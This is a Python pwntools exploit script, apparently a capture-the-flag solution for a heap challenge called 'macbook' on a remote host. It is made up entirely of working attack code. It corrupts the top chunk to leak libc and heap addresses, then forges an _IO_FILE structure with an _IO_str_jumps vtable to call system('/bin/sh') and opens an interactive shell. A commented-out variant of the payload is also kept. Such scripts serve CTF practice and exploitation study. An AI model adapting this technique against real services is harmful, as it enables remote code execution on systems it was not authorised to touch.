#!/usr/bin/env python
#-*- encoding=utf-8 -*-
from pwn import *
from FILE import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./macbook.ori')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('10.21.13.112', 10005)
    libc = ELF('./libc.so.6')

def cmd(c):
    p.recvuntil('your choice?')
    p.sendline(str(c))

def new(sz, conf):
    cmd(1)
    p.recvuntil('configuration: ')
    p.sendline(str(sz))
    p.recvuntil('configuration: ')
    p.send(conf)
    p.recvuntil('touchbar? [y/n] ')
    p.sendline('n')

def edit(sz, conf):
    cmd(2)
    p.recvuntil('configuration :')
    p.sendline(str(sz))
    p.recvuntil('configuration :')
    p.send(conf)
    p.recvuntil('touchbar [y/n]? ')
    p.sendline('n')

def free():
    cmd(3)

def show():
    cmd(4)

def leave():
    cmd(5)

# leak libc
new(0x28, '1' * 0x8)
edit(0x68, 'A' * 0x40 + p64(0) + p64(0xf91))
new(0x1000, '2' * 0x8)
new(0x500, '3' * 0x8)
show()
p.recvuntil('3' * 0x8)
leak_libc = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
info('leak_libc = ' + hex(leak_libc))
offset = libc.symbols['__malloc_hook'] + 0x10 + 1640
libc_base = leak_libc - offset
info('libc_base = ' + hex(libc_base))
if libc_base & 0xffffffff < 0x80000000:
    warning('LOWWORD(libc_base) < 0x80000000')
    p.close()
    exit(-1)

# leak heap
edit(0x500, 'B' * 0x10)
show()
p.recvuntil('B' * 0x10)
leak_heap = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
info('leak_heap = ' + hex(leak_heap))
heap_base = leak_heap - 0xd0
info('heap_base = ' + hex(heap_base))

bin_sh_on_heap_addr = heap_base + 0xe0
info('bin_sh_on_heap_addr = ' + hex(bin_sh_on_heap_addr))
bin_sh_in_libc_addr = libc_base + next(libc.search('/bin/sh'))
info('bin_sh_in_libc_addr = ' + hex(bin_sh_in_libc_addr))
system_addr = libc_base + libc.symbols['system']
io_str_jumps = libc_base + libc.symbols['_IO_file_jumps'] + 0xc0 # _IO_str_jumps
io_list_all = libc_base + libc.symbols['_IO_list_all']
'''
fake_file = IO_FILE_plus_struct()
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base = io_list_all - 0x10
# Bypass _IO_str_finish
fake_file._mode = 0
fake_file._IO_write_ptr = 1
fake_file._IO_write_base = 0
fake_file._flags = 0
fake_file._IO_buf_base = bin_sh_in_libc_addr
# Call _IO_str_finish when call _IO_str_overflow
fake_file.vtable = io_str_jumps - 8
payload = '/bin/sh\x00'.ljust(0x500, 'C') + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)
payload += str(fake_file) + p64(0) + p64(system_addr)
'''
fake_file = IO_FILE_plus_struct()
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base = io_list_all - 0x10
# Bypass _IO_str_overflow
fake_file._flags = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 0x7fffffffffffffff
fake_file._IO_buf_base = 0
fake_file._IO_buf_end = (bin_sh_on_heap_addr - 100) / 2
# change vtable
fake_file.vtable = io_str_jumps
payload = '/bin/sh\x00'.ljust(0x500, 'C') + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)
payload += str(fake_file) + p64(system_addr)
edit(0x800, payload)
#gdb.attach(p, 'b _dl_debug_initialize+49\nc')
cmd(1)

p.interactive('💻 >  ')

